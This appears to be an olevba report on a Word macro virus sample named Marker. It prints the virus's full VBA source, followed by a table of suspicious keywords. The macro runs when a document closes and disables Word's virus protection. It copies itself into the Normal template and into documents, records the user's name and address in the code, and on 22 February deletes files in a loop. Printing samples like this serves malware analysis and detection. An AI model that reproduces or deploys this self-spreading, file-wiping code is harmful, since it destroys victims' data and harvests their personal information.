olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-91abf6bdf3a751fd26adbef3e70ff25f6998c692
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-91abf6bdf3a751fd26adbef3e70ff25f6998c692 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()

On Error Resume Next

Const Murder = "<-- Its Murder!!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim rep As Integer
Dim virusCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.codemodule.Find(Murder, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.codemodule.Find(Murder, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False
Options.SaveNormalPrompt = False



'PayLoad
Delivery:
If Day(Now()) = 22 And Month(Now()) = 2 Then
       Kill "*.*":
       rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
       GoTo Delivery
       End If
       
'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   


'.......................................................................................
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
  virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    LogData = Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM -") & _
                     Format(Date, "dddd,d mmm,yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & Application.UserAddress & Chr(13) & _
              "' " & Application.ActiveDocument & Chr(13)
              
              
    virusCode = virusCode & LogData
   

    nt.codemodule.DeleteLines 1, nt.codemodule.countoflines
    nt.codemodule.AddFromString virusCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
 
End If



'..........................................................................................
  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines)

    ad.codemodule.DeleteLines 1, ad.codemodule.countoflines
    ad.codemodule.AddFromString virusCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    End If



End Sub


' Potential Murder Victims  "Marked for death...If I kiss you now, you'll probably die later..."
'
' 09:36:59 PM -Sunday,1 Aug,1999
' Shane Coursen
'
' MARKER-P.DOC


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

